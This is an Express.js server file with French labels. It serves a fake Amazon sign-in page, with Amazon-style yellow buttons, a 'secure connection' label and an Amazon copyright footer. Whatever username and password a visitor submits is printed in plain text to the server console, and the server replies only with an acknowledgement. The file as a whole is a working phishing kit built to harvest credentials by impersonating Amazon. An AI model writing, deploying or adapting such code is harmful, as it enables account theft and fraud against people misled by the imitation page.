const express = require("express");

const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// FORM
app.get("/", (req, res) => {
res.send(`
<!DOCTYPE html>
<html>

<head>
<title>Formulaire</title>

<style>

body{
margin:0;
font-family: Arial, sans-serif;
background: linear-gradient(135deg, #ffffff, #ffffff);
height:100vh;
display:flex;
flex-direction:column;
}

/* 2 sections */
.top-section{
height:66.5vh;
display:flex;
justify-content:center;
align-items:center;
}

.bottom-section{
height:44.44vh; /* ~4/9 */
border-top:1px solid #ccc;
display:flex;
justify-content:center;
align-items:center;
background:#fafafa;
}

/* contenu existant */
.wrapper{
  display:flex;
  flex-direction:column;
  align-items:center;
}

.logo img{
  width:135px;
  height:auto;
  margin-bottom:50px;

  filter: saturate(10) contrast(2) brightness(1.2);
}

.container{
  background:white;
  padding:40px;
  padding-top:50px;
  border-radius:15px;
  width:300px;
  height:40vh;
  box-shadow:0 10px 25px rgba(0,0,0,0.2);
  text-align:center;
}

h2{
margin-bottom:20px;
color:#333;
}

input{
width:90%;
padding:12px;
margin-top:10px;
border:1px solid #ddd;
border-radius:8px;
outline:none;
transition:0.2s;
}

input:focus{
border-color:#586ff2;
box-shadow:0 0 1px #FFCE12;
}

button{
width:100%;
padding:12px;
margin-top:15px;
background:#FFCE12;
filter: brightness(1.05);
color:black;
border:none;
border-radius:20px;
cursor:pointer;
font-weight:bold;
transition:0.2s;
}

button:hover{
background:#FFCE12;
filter: contrast(0.95) brightness(0.99);
}

.footer{
margin-top:15px;
font-size:12px;
color:gray;
}

</style>
</head>

<body>

<div class="top-section">

  <div class="wrapper">

    <div class="logo">
      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSbmdZn1ZFwtk1ibp75fmU1zaBGF8YLgJ3jLA&s" alt="Logo">
    </div>

    <div class="container">

      <h2>S'identifier</h2>

      <form method="POST" action="/send">

        <input name="username" placeholder="Nom d'utilisateur" required />
        <input type="password" name="password" placeholder="Mot de passe" required />

        <button type="submit">Se connecter</button>

      </form>

      <div class="footer">
        Connexion Sécurisée
      </div>

    </div>

  </div>

</div>

<div class="bottom-section">
  <p>@ 1996-2026, Amazon.com Inc. ou ses affiliés</p>
</div>

</body>
</html>
`);
});

// RECEIVE
app.post("/send", (req, res) => {

console.log("BODY:", req.body);
console.log("USERNAME:", req.body.username);
console.log("PASSWORD:", req.body.password);

res.send("OK reçu");
});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
console.log("Server running on port " + PORT);
});